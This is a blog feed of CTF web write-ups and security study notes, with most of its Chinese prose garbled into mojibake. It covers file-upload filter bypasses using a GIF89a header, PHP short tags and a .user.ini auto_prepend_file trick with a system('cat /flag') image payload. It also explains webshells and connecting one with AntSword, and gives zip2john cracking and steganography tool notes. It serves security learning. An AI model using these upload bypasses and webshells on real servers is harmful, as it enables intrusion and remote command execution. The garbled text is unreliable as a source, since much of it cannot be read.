<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="COFFEESCRIPT"><figure class="iseeu highlight /coffeescript"><table><tr><td class="code"><pre><span class="line">phpå®ä¾‹åŒ–ï¼šæ˜¯æŒ‡åœ¨é¢å‘å¯¹è±¡çš„ç¼–ç¨‹ä¸­ï¼ŒæŠŠç”¨ç±»åˆ›å»ºå¯¹è±¡çš„è¿‡ç¨‹ç§°ä¸ºå®ä¾‹åŒ–ï¼Œæ˜¯å°†ä¸€ä¸ªæŠ½è±¡çš„æ¦‚å¿µç±»ï¼Œå…·ä½“åˆ°è¯¥ç±»å®ç‰©çš„è¿‡ç¨‹ï¼Œå®ä¾‹åŒ–è¿‡ç¨‹ä¸­ä¸€èˆ¬ç”±ã€ç±»å å¯¹è±¡å = <span class="keyword">new</span> ç±»åï¼ˆå‚æ•°<span class="number">1</span>ï¼Œå‚æ•°<span class="number">2.</span>..å‚æ•°nï¼‰ã€‘æ„æˆã€‚</span><br><span class="line"></span><br><span class="line">phpç±»å¯¹è±¡æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿ</span><br><span class="line">ç±» âˆ’ å®šä¹‰äº†ä¸€ä»¶äº‹ç‰©çš„æŠ½è±¡ç‰¹ç‚¹ã€‚ç±»çš„å®šä¹‰åŒ…å«äº†æ•°æ®çš„å½¢å¼ä»¥åŠå¯¹æ•°æ®çš„æ“ä½œã€‚</span><br><span class="line">å¯¹è±¡ âˆ’ æ˜¯ç±»çš„å®ä¾‹ã€‚</span><br><span class="line">åœ¨é¢å‘å¯¹è±¡çš„ç¨‹åºè®¾è®¡ï¼ˆè‹±è¯­ï¼š<span class="built_in">Object</span>-oriented programmingï¼Œç¼©å†™ï¼šOOPï¼‰ä¸­ï¼Œå¯¹è±¡æ˜¯ä¸€ä¸ªç”±ä¿¡æ¯åŠå¯¹ä¿¡æ¯è¿›è¡Œå¤„ç†çš„æè¿°æ‰€ç»„æˆçš„æ•´ä½“ï¼Œæ˜¯å¯¹ç°å®ä¸–ç•Œçš„æŠ½è±¡ã€‚åœ¨ç°å®ä¸–ç•Œé‡Œæˆ‘ä»¬æ‰€é¢å¯¹çš„äº‹æƒ…éƒ½æ˜¯å¯¹è±¡ï¼Œå¦‚è®¡ç®—æœºã€ç”µè§†æœºã€è‡ªè¡Œè½¦ç­‰ã€‚</span><br></pre></td></tr></table></figure></div>

<h2 id="14-upload1"><a href="#14-upload1" class="headerlink" title="14.upload1"></a>14.upload1</h2><h3 id="1-é¢˜ç›®æè¿°-23"><a href="#1-é¢˜ç›®æè¿°-23" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>
<h3 id="2-wp-16"><a href="#2-wp-16" class="headerlink" title="2)wp"></a>2)wp</h3><p>å…¸å‹çš„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œå¯ä»¥å…ˆæŠŠupload-labsçº¿ä¸‹é¶åœºå­¦ä¹ ä¸€ä¸‹</p>
<p>å…ˆç›´æ¥ä¸Šä¼ phpæ–‡ä»¶ï¼Œå‘ç°è¢«æ‹¦æˆª</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220704104557362.png" alt="image-20220704104557362"></p>
<p>äºæ˜¯æ„é€ ä¸€ä¸ªå›¾ç‰‡æœ¨é©¬ä¸Šä¼ ï¼Œç„¶åburpä¿®æ”¹åç¼€ï¼Œçœ‹çœ‹æ˜¯ä¸æ˜¯å‰ç«¯éªŒè¯</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220704104752019.png" alt="image-20220704104752019"></p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220704104814064.png" alt="image-20220704104814064"></p>
<p>å‘ç°ä¸Šä¼ æˆåŠŸ</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220704104830480.png" alt="image-20220704104830480"></p>
<p>ç”¨èšå‰‘è¯•ç€è¿ä¸€ä¸‹</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220704105115729.png" alt="image-20220704105115729"></p>
<p>å‘ç°è¿æ¥æˆåŠŸï¼Œæ‰“å¼€çœ‹çœ‹ï¼Œåœ¨htmlä¸‹å‘ç°flag.php</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220704105139801.png" alt="image-20220704105139801"></p>
<p>æ‰“å¼€æ–‡ä»¶</p>
<p>å¾—åˆ°flag</p>
<hr>
<p>åé¢çš„é¢˜éš¾åº¦é£å‡ï¼Œæ°´å¹³æœ‰é™ï¼Œåé¢çš„é¢˜ä»…å†™ä¸€äº›ä¸ªäººç¬”è®°ï¼Œå»ºè®®è®¤çœŸé˜…è¯»å…¶ä»–å¤§ä½¬çš„wpï¼Œé‡åˆ°éš¾ç‚¹ï¼Œå»ºè®®å…ˆå·©å›ºæ¦‚å¿µåŸºç¡€</p>
<h2 id="15-easytornado"><a href="#15-easytornado" class="headerlink" title="15.easytornado"></a>15.easytornado</h2><p>ä¸€é“tornadoæ¡†æ¶é¢˜ï¼Œå±äºsstiæ³¨å…¥ï¼Œå»ºè®®å…ˆçœ‹ä¸€äº›æ–‡ç« </p>
<p>äº†è§£äº†å†å°è¯•å®Œæˆ</p>
<hr>
<h2 id="1-easyupload"><a href="#1-easyupload" class="headerlink" title="1.easyupload"></a>1.easyupload</h2><h3 id="1-é¢˜ç›®æè¿°-24"><a href="#1-é¢˜ç›®æè¿°-24" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>ä¸€ååˆæ ¼çš„é»‘å®¢çœ¼ä¸­ï¼Œæ‰€æœ‰çš„ä¸Šä¼ ç‚¹éƒ½æ˜¯å¼€å‘è€…ç•™ä¸‹çš„åé—¨</p>
<h4 id="2-wp-17"><a href="#2-wp-17" class="headerlink" title="2)wp"></a>2)wp</h4><p><u><em>è¿™é“é¢˜å†™çš„1æ˜Ÿï¼Œä½†æ˜¯è¿‡æ»¤åˆå¤šï¼Œè¿˜æ¶‰åŠäº†ä¸Šä¼ .user.iniæ–‡ä»¶ï¼Œå­¦åˆ°äº†,ä¸‹é¢æ˜¯å¤§ä½¬çš„wp</em></u></p>
<p>æœ¬é¢˜éœ€è¦åˆ©ç”¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ç‚¹ï¼Œé€šè¿‡ç»•è¿‡æœåŠ¡å™¨çš„å®‰å…¨é˜²æŠ¤ï¼Œè¾¾åˆ°getshellçš„ç›®çš„</p>
<p>æœ¬é¢˜çš„ä¸»è¦è€ƒç‚¹ä¸ºåˆ©ç”¨fastcgiçš„.user.iniç‰¹æ€§è¿›è¡Œä»»æ„å‘½ä»¤æ‰§è¡Œ</p>
<p>è¿™é‡Œéœ€è¦ç»•è¿‡çš„ç‚¹å¦‚ä¸‹</p>
<ul>
<li>æ£€æŸ¥æ–‡ä»¶å†…å®¹æ˜¯å¦æœ‰phpå­—ç¬¦ä¸²</li>
<li>æ£€æŸ¥åç¼€ä¸­æ˜¯å¦æœ‰htaccessæˆ–ph</li>
<li>æ£€æŸ¥æ–‡ä»¶å¤´éƒ¨ä¿¡æ¯</li>
<li>æ–‡ä»¶MIMEç±»å‹</li>
</ul>
<p>å¯¹äºç¬¬ä¸€ç‚¹å¯ä»¥åˆ©ç”¨çŸ­æ ‡ç­¾ç»•è¿‡ï¼Œä¾‹å¦‚ <?=phpinfo();?></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">æŠŠshort_open_tag å­—æ®µæ”¹ä¸ºOnï¼Œå°±å¯ä»¥å®ç°çŸ­æ ‡ç­¾åŠŸèƒ½</span><br><span class="line"></span><br><span class="line">çŸ­æ ‡ç­¾ï¼š</span><br><span class="line"><span class="number">1</span>.èƒ½æ­£å¸¸è§£æç±»ä¼¼äºè¿™æ ·å½¢å¼çš„phpæ–‡ä»¶ï¼š <span class="title function_ invoke__">phpinfo</span>() <span class="meta">?&gt;</span>  </span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.ä½¿ç”¨<span class="meta">&lt;?=</span><span class="variable">$a</span><span class="meta">?&gt;</span>çš„å½¢å¼è¾“å‡ºï¼Œåœ¨çŸ­æ ‡ç­¾çœ‹æ¥ï¼Œ<span class="meta">&lt;?=</span><span class="variable">$a</span><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>.<span class="meta">&lt;?=</span>(è¡¨è¾¾å¼)<span class="meta">?&gt;</span></span><br><span class="line">å°±ç›¸å½“äº</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$a</span><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> (è¡¨è¾¾å¼)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">æ­£ç¡®ï¼š</span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27; phpinfo();?&gt;&lt;? echo $a ?&gt;&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">æŠ¥é”™ï¼š</span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;&lt;? phpinfo();?&gt;&lt;?=$a ?&gt;&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">ä»è¿™ä¸ªå¯¹æ¯”è¯•éªŒæˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼š</span><br><span class="line">åœ¨çŸ­æ ‡ç­¾æ¨¡å¼ä¸‹ï¼Œ</span><br><span class="line">æˆ‘ä»¬æ‰§è¡Œphpè¯­å¥phpå‡½æ•°ï¼Œéƒ½ç”¨ç±»ä¼¼äºè¿™æ ·å½¢å¼çš„phpæ–‡ä»¶ï¼š</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br><span class="line">ä½†æ˜¯æˆ‘ä»¬è¦è¾“å‡ºä¸€ä¸ªflagï¼Œæˆ–è€…å˜é‡æ—¶ï¼Œä½¿ç”¨<span class="meta">&lt;?=</span><span class="variable">$a</span><span class="meta">?&gt;</span>çš„å½¢å¼è¾“å‡º</span><br></pre></td></tr></table></figure></div>

<p>å¯¹äºç¬¬äºŒç‚¹å¯ä»¥é€šè¿‡ä¸Šä¼ .user.iniä»¥åŠæ­£å¸¸jpgæ–‡ä»¶æ¥è¿›è¡Œgetshell,å¯ä»¥å‚è€ƒä»¥ä¸‹æ–‡ç« </p>
<p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">æ–‡ç« </a></p>
<p>åœ¨æœåŠ¡å™¨ä¸­ï¼Œåªè¦æ˜¯è¿ç”¨äº†fastcgiçš„æœåŠ¡å™¨å°±èƒ½å¤Ÿåˆ©ç”¨è¯¥æ–¹å¼getshellï¼Œä¸è®ºæ˜¯apacheæˆ–è€…ngnixæˆ–æ˜¯å…¶ä»–æœåŠ¡å™¨ã€‚</p>
<p> è¿™ä¸ªæ–‡ä»¶æ˜¯php.iniçš„è¡¥å……æ–‡ä»¶ï¼Œå½“ç½‘é¡µè®¿é—®çš„æ—¶å€™å°±ä¼šè‡ªåŠ¨æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æ˜¯å¦æœ‰.user.iniï¼Œç„¶åå°†å…¶è¡¥å……è¿›php.iniï¼Œå¹¶ä½œä¸ºcgiçš„å¯åŠ¨é¡¹ã€‚</p>
<p> å…¶ä¸­å¾ˆå¤šåŠŸèƒ½è®¾ç½®äº†åªèƒ½php.inié…ç½®ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰ä¸€äº›å±é™©çš„åŠŸèƒ½å¯ä»¥è¢«æˆ‘ä»¬æ§åˆ¶ï¼Œæ¯”å¦‚auto_prepend_fileã€‚</p>
<p>ç¬¬ä¸‰ç‚¹ç»•è¿‡æ–¹å¼å³åœ¨æ–‡ä»¶å¤´éƒ¨æ·»åŠ ä¸€ä¸ªå›¾ç‰‡çš„æ–‡ä»¶å¤´ï¼Œæ¯”å¦‚<code>GIF89a</code></p>
<p>ç¬¬å››ç‚¹ç»•è¿‡æ–¹æ³•å³ä¿®æ”¹ä¸Šä¼ æ—¶çš„Content-Type</p>
<p>å› æ­¤æœ€ç»ˆçš„payloadä¸ºï¼š<br> ä¸Šä¼ .user.iniï¼Œå†…å®¹ä¸º</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">GIF89a                  </span><br><span class="line"><span class="attribute">auto_prepend_file</span>=a.jpg</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">auto</span>_append_fileã€<span class="built_in">auto</span>_prepend_file:æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼Œè‡ªåŠ¨åŒ…å«åœ¨è¦æ‰§è¡Œçš„æ–‡ä»¶å‰ï¼Œç±»ä¼¼äºåœ¨æ–‡ä»¶å‰è°ƒç”¨äº†require()å‡½æ•°ã€‚è€Œ<span class="built_in">auto</span>_append_fileç±»ä¼¼ï¼Œåªæ˜¯åœ¨æ–‡ä»¶åé¢åŒ…å«ã€‚ </span><br><span class="line"></span><br><span class="line">ä½¿ç”¨æ–¹æ³•å¾ˆç®€å•ï¼Œç›´æ¥å†™åœ¨.user.iniä¸­ï¼š</span><br></pre></td></tr></table></figure></div>

<p>ä¸Šä¼ a.jpgï¼Œå†…å®¹ä¸º</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?</span>=<span class="keyword">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨å­¦ä¹ </category>
      </categories>
  </entry>
  <entry>
    <title>ç–‘é—®è®°å½•</title>
    <url>/2022/06/21/Qusetion/</url>
    <content><![CDATA[<p><u><code>ä»¥ä¸‹çš„é—®é¢˜ï¼Œæœ‰çš„å·²ç»è§£å†³ï¼Œæœ‰çš„è¿˜å­˜åœ¨ï¼Œå¦‚æœæœ‰å¤§ä½¬æ–¹ä¾¿è®²è§£æŒ‡ç‚¹ï¼Œæˆ–è€…æˆ‘çš„è§£å†³å†…å®¹ä¸å®Œå–„æˆ–æœ‰é—®é¢˜ï¼Œæ¬¢è¿é€šè¿‡é‚®ç®±æˆ–QQç§ä¿¡æˆ‘ï¼Œä¸èƒœæ„Ÿæ¿€</code></u></p>
<span id="more"></span>

<h2 id="1-dirsearchçš„åŸç†ï¼Œæœ‰æ²¡æœ‰å±€é™ï¼Ÿ"><a href="#1-dirsearchçš„åŸç†ï¼Œæœ‰æ²¡æœ‰å±€é™ï¼Ÿ" class="headerlink" title="1.dirsearchçš„åŸç†ï¼Œæœ‰æ²¡æœ‰å±€é™ï¼Ÿ"></a>1.dirsearchçš„åŸç†ï¼Œæœ‰æ²¡æœ‰å±€é™ï¼Ÿ</h2><p>å°±æ˜¯ä¸€ä¸ªè„šæœ¬ï¼Œåˆ©ç”¨å­—å…¸ä¸æ–­å‘ç½‘ç«™å‘å‡ºè¯·æ±‚ï¼Œåœ¨è¿”å›çŠ¶æ€ç ï¼Œä»¥ç¡®å®šç½‘ç«™ä¸‹æ˜¯å¦æœ‰å¯¹åº”çš„ç›®å½•æˆ–æ–‡ä»¶</p>
<p>å±€é™å°±æ˜¯åŒä¸€æ—¶é—´å‘ç½‘ç«™å‘å‡ºå¤§é‡è¯·æ±‚ï¼Œå®¹æ˜“æŠŠå¯¹æ–¹ç½‘ç«™æå´©æˆ–è€…è‡ªå·±ipè¢«å°ï¼Œä¸èƒ½å†è®¿é—®äº†</p>
<h2 id="2-èšå‰‘çš„åŸç†ï¼Œè¿æ¥æ–‡ä»¶åï¼Œä¸ºä»€ä¹ˆå¯ä»¥ç›´æ¥è®¿é—®ç›®å½•ä¸‹å…¶ä»–æ–‡ä»¶ï¼Ÿ"><a href="#2-èšå‰‘çš„åŸç†ï¼Œè¿æ¥æ–‡ä»¶åï¼Œä¸ºä»€ä¹ˆå¯ä»¥ç›´æ¥è®¿é—®ç›®å½•ä¸‹å…¶ä»–æ–‡ä»¶ï¼Ÿ" class="headerlink" title="2.èšå‰‘çš„åŸç†ï¼Œè¿æ¥æ–‡ä»¶åï¼Œä¸ºä»€ä¹ˆå¯ä»¥ç›´æ¥è®¿é—®ç›®å½•ä¸‹å…¶ä»–æ–‡ä»¶ï¼Ÿ"></a>2.èšå‰‘çš„åŸç†ï¼Œè¿æ¥æ–‡ä»¶åï¼Œä¸ºä»€ä¹ˆå¯ä»¥ç›´æ¥è®¿é—®ç›®å½•ä¸‹å…¶ä»–æ–‡ä»¶ï¼Ÿ</h2><p>è¿™é‡Œæ˜¯æˆ‘ä¸ªäººçš„çŒœæƒ³ï¼Œä¸Šä¼ shellæ–‡ä»¶åï¼Œå…¶å®å¯ä»¥åœ¨ç½‘é¡µä¸­ç›´æ¥åˆ©ç”¨shellè¯»å–æ–‡ä»¶å†…å®¹å’Œç›®å½•</p>
<p>è¿™æ˜¯ä¸Šä¼ äº†ä¸€ä¸ªshellï¼Œä»¥postæ–¹å¼æŸ¥çœ‹phpinfo()å‘ç°æˆåŠŸï¼Œå°±æ˜¯è¿æ¥ä¸Šäº†</p>
<p><img src="/2022/06/21/Qusetion/image-20220827111701261.png" alt="image-20220827111701261"></p>
<p>è¿˜å¯ä»¥æŸ¥çœ‹æ ¹ç›®å½•å†…å®¹</p>
<p><img src="/2022/06/21/Qusetion/image-20220827112313891.png" alt="image-20220827112313891"></p>
<p>å…¶ä»–ç›®å½•ä¹Ÿå¯ä»¥</p>
<p><img src="/2022/06/21/Qusetion/image-20220827112544385.png" alt="image-20220827112544385"></p>
<p>å¹¶ä¸”è¿˜å¯ä»¥è¯»å–å†…å®¹</p>
<p><img src="/2022/06/21/Qusetion/image-20220827112626617.png" alt="image-20220827112626617"></p>
<p>è€Œèšå‰‘ä¹Ÿå¯ä»¥å®ç°è¿™äº›åŠŸèƒ½ï¼Œå¯èƒ½æ˜¯æŠŠè¿™äº›ä»£ç å‘½ä»¤è½¬åŒ–æˆå›¾åƒåŒ–ï¼Œæ–¹ä¾¿æ“ä½œ</p>
<p>ä½†æ˜¯èšå‰‘æ“ä½œæ›´åŠ ç®€å•ä¸€äº›ï¼Œå¹¶ä¸”å¯ä»¥è¿›è¡Œä¸€äº›åˆ é™¤æˆ–ä¿®æ”¹çš„æ“ä½œï¼Œè™½ç„¶æŒ‰ä¸Šé¢çš„åŸç†ä¹Ÿå¯ä»¥å®ç°ï¼Œä½†æ˜æ˜¾ä¸æ–¹ä¾¿ï¼Œä½†å¯ä»¥å­¦ä¹ ä¸€ä¸€ä¸‹</p>
<h2 id="3-ä¸ºä»€ä¹ˆæˆ‘çš„-htacessæ— æ³•å‘æŒ¥ä½œç”¨-æŠŠå…¶ä»–æ–‡ä»¶è§£è¯»ä¸ºphp-ï¼Œä½†æ˜¯è¿˜ä¼šå½±å“å®ƒæ‰€åœ¨æ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶ï¼ˆphpï¼‰ä¸èšå‰‘è¿æ¥ï¼Ÿ"><a href="#3-ä¸ºä»€ä¹ˆæˆ‘çš„-htacessæ— æ³•å‘æŒ¥ä½œç”¨-æŠŠå…¶ä»–æ–‡ä»¶è§£è¯»ä¸ºphp-ï¼Œä½†æ˜¯è¿˜ä¼šå½±å“å®ƒæ‰€åœ¨æ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶ï¼ˆphpï¼‰ä¸èšå‰‘è¿æ¥ï¼Ÿ" class="headerlink" title="3.ä¸ºä»€ä¹ˆæˆ‘çš„.htacessæ— æ³•å‘æŒ¥ä½œç”¨(æŠŠå…¶ä»–æ–‡ä»¶è§£è¯»ä¸ºphp)ï¼Œä½†æ˜¯è¿˜ä¼šå½±å“å®ƒæ‰€åœ¨æ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶ï¼ˆphpï¼‰ä¸èšå‰‘è¿æ¥ï¼Ÿ"></a>3.ä¸ºä»€ä¹ˆæˆ‘çš„.htacessæ— æ³•å‘æŒ¥ä½œç”¨(æŠŠå…¶ä»–æ–‡ä»¶è§£è¯»ä¸ºphp)ï¼Œä½†æ˜¯è¿˜ä¼šå½±å“å®ƒæ‰€åœ¨æ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶ï¼ˆphpï¼‰ä¸èšå‰‘è¿æ¥ï¼Ÿ</h2><p>è¿™ä¸ªé—®é¢˜ä¹Ÿä¸èƒ½ç®—å®Œå…¨è§£å†³ï¼Œä½†æ˜¯æˆ‘ç”¨èœåˆ€çš„æ—¶å€™ï¼Œå°±å¯ä»¥æ­£å¸¸ä½¿ç”¨ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯èšå‰‘ç‰ˆæœ¬é—®é¢˜ï¼Œä½†æ˜¯èšå‰‘ä¹Ÿæ˜¯æœ€æ–°ç‰ˆï¼Œåæ­£ç°åœ¨èƒ½ç”¨å°±è¡Œäº†</p>
<hr>
<p>ç°åœ¨åˆå‘ç°çº¿ä¸Šçš„åˆ©ç”¨.htacessæ–‡ä»¶çš„é¢˜ç”¨èšå‰‘ä¹Ÿå¯ä»¥åšï¼Œéº»äº†</p>
<h2 id="4-ä»€ä¹ˆæ˜¯webshell"><a href="#4-ä»€ä¹ˆæ˜¯webshell" class="headerlink" title="4.ä»€ä¹ˆæ˜¯webshell?"></a>4.ä»€ä¹ˆæ˜¯webshell?</h2><h3 id="1ï¼‰webshellç®€ä»‹"><a href="#1ï¼‰webshellç®€ä»‹" class="headerlink" title="1ï¼‰webshellç®€ä»‹"></a>1ï¼‰webshellç®€ä»‹</h3><p>Webshellæ˜¯é€šè¿‡æœåŠ¡å™¨å¼€æ”¾çš„ç«¯å£è·å–æœåŠ¡å™¨çš„æŸäº›æƒé™ã€‚</p>
<p>webshellåˆç§°è„šæœ¬æœ¨é©¬ï¼Œä¸€èˆ¬åˆ†ä¸ºå¤§é©¬ã€å°é©¬ã€ä¸€å¥è¯æœ¨é©¬ã€‚</p>
<p>å¤§é©¬ï¼Œä½“ç§¯å¤§ã€åŠŸèƒ½é½å…¨ã€èƒ½å¤Ÿç®¡ç†æ•°æ®åº“ã€æ–‡ä»¶ç®¡ç†ã€å¯¹ç«™ç‚¹è¿›è¡Œå¿«é€Ÿçš„ä¿¡æ¯æ”¶é›†ï¼Œç”šè‡³èƒ½å¤Ÿææƒã€‚</p>
<p>å°é©¬ï¼Œä¸€èˆ¬è€Œè¨€ï¼Œæˆ‘ä»¬åœ¨ä¸Šä¼ æ–‡ä»¶çš„æ—¶å€™ï¼Œä¼šè¢«é™åˆ¶ä¸Šä¼ çš„æ–‡ä»¶å¤§å°æˆ–æ˜¯æ‹¦æˆªçš„æƒ…å†µï¼Œé‚£ä¹ˆæˆ‘é€šè¿‡å°é©¬æ¥ä¸Šä¼ å¤§é©¬ï¼Œå®ç°æˆ‘ä»¬æƒ³è¦çš„åŠŸèƒ½ã€‚</p>
<p>ä¸€å¥è¯æœ¨é©¬ï¼ŒçŸ­å°ç²¾æ‚ã€åŠŸèƒ½å¼ºå¤§ã€éšè”½æ€§å¥½ã€ä½¿ç”¨å®¢æˆ·ç«¯å¯ä»¥å¿«é€Ÿç®¡ç†webshellã€‚</p>
<h3 id="2ï¼‰åŸç†"><a href="#2ï¼‰åŸç†" class="headerlink" title="2ï¼‰åŸç†"></a>2ï¼‰åŸç†</h3><p>åˆ©ç”¨<u>æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€SQLæ³¨å…¥æ¼æ´ã€RCEæ¼æ´</u>ç­‰ï¼Œå°†<u>æ¶æ„æ–‡ä»¶æ”¾åˆ°webæœåŠ¡å™¨</u>ä¸­ï¼Œä¹Ÿå°±æ˜¯å¸¸è¯´çš„â€<strong>åé—¨</strong>â€ï¼Œä¹‹åå¯ä»¥<u>è¿›è¡Œæ–‡ä»¶ç®¡ç†ã€æ•°æ®åº“ç®¡ç†ã€è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€ææƒç­‰æ¶æ„æ“ä½œ</u>ã€‚</p>
]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨å­¦ä¹ </category>
      </categories>
  </entry>
  <entry>
    <title>å¯†ç +æ‚é¡¹é¢˜ç®€å•è®°å½•</title>
    <url>/2022/09/27/crypto+misc/</url>
    <content><![CDATA[<p><code>åªä¼šwebï¼Œå¾—åˆ†å¤ªå°‘ï¼Œè¿˜æ˜¯æç‚¹å¯†ç å’Œæ‚é¡¹æ¥æé«˜ä¸€ä¸‹</code></p>
<span id="more"></span>

<h2 id="1-ä¸€èˆ¬åŠ å¯†"><a href="#1-ä¸€èˆ¬åŠ å¯†" class="headerlink" title="1.ä¸€èˆ¬åŠ å¯†"></a>1.ä¸€èˆ¬åŠ å¯†</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="EXCEL"><figure class="iseeu highlight /excel"><table><tr><td class="code"><pre><span class="line">ç›´æ¥ç”¨kaliçš„</span><br><span class="line"></span><br><span class="line">ciphey -<span class="built_in">t</span> <span class="string">&quot;xxx&quot;</span></span><br></pre></td></tr></table></figure></div>



<h2 id="2-SSTVå£°éŸ³é¢˜"><a href="#2-SSTVå£°éŸ³é¢˜" class="headerlink" title="2.SSTVå£°éŸ³é¢˜"></a>2.SSTVå£°éŸ³é¢˜</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GCODE"><figure class="iseeu highlight /gcode"><table><tr><td class="code"><pre><span class="line">ç”¨wi<span class="symbol">n10</span>ä¸Š</span><br><span class="line"></span><br><span class="line">MMSSTVå·¥å…·è§£æå£°éŸ³ï¼Œæœ€å¥½ç”¨è™šæ‹Ÿå£°å¡è¿™æ ·å¯ä»¥å±è”½ä¸€äº›æ‚éŸ³ã€æŠŠå£°éŸ³ç»™MMSSTVå¬ã€‘</span><br></pre></td></tr></table></figure></div>

<h2 id="3-åŠ å¯†å‹ç¼©åŒ…"><a href="#3-åŠ å¯†å‹ç¼©åŒ…" class="headerlink" title="3.åŠ å¯†å‹ç¼©åŒ…"></a>3.åŠ å¯†å‹ç¼©åŒ…</h2><h3 id="1ï¼‰win10"><a href="#1ï¼‰win10" class="headerlink" title="*1ï¼‰win10"></a>*1ï¼‰win10</h3><p>ç”¨<code>win10</code>å·¥å…·çˆ†ç ´å‹ç¼©åŒ…å¯†ç </p>
<h3 id="2ï¼‰kali"><a href="#2ï¼‰kali" class="headerlink" title="2ï¼‰kali"></a>2ï¼‰kali</h3><p><code>kali john</code>çˆ†ç ´å‹ç¼©åŒ…</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">zip2john å‹ç¼©åŒ…çš„åå­—<span class="string">.zip</span> &gt;&gt; passwdhash.txt</span><br></pre></td></tr></table></figure>



<h2 id="4-å›¾ç‰‡éšå†™"><a href="#4-å›¾ç‰‡éšå†™" class="headerlink" title="4.å›¾ç‰‡éšå†™"></a>4.å›¾ç‰‡éšå†™</h2><h3 id="1ï¼‰win10-1"><a href="#1ï¼‰win10-1" class="headerlink" title="1ï¼‰win10"></a>1ï¼‰win10</h3><p>åˆ©ç”¨<code>Stegsolve</code>è§£æå›¾ç‰‡éšå†™å†…å®¹</p>
<h3 id="2ï¼‰kali-1"><a href="#2ï¼‰kali-1" class="headerlink" title="*2ï¼‰kali"></a>*2ï¼‰kali</h3><p><code>zsteg</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NGINX"><figure class="iseeu highlight /nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">zsteg</span> å›¾ç‰‡</span><br></pre></td></tr></table></figure></div>



<h2 id="5-é›¶å®½å­—ç¬¦éšå†™"><a href="#5-é›¶å®½å­—ç¬¦éšå†™" class="headerlink" title="5.é›¶å®½å­—ç¬¦éšå†™"></a>5.é›¶å®½å­—ç¬¦éšå†™</h2><p><a href="http://330k.github.io/misc_tools/unicode_steganography.html">http://330k.github.io/misc_tools/unicode_steganography.html</a></p>
<p>æˆ‘ä»¬å¼€å§‹çœ‹è¿™ä¸ªå†…å®¹æ˜¯æ²¡æœ‰ä»€ä¹ˆé—®é¢˜çš„ï¼Œä½†æ˜¯åº•ä¸‹çš„</p>
<p><code>ç¬¬7è¡Œï¼Œç¬¬204åˆ—</code></p>
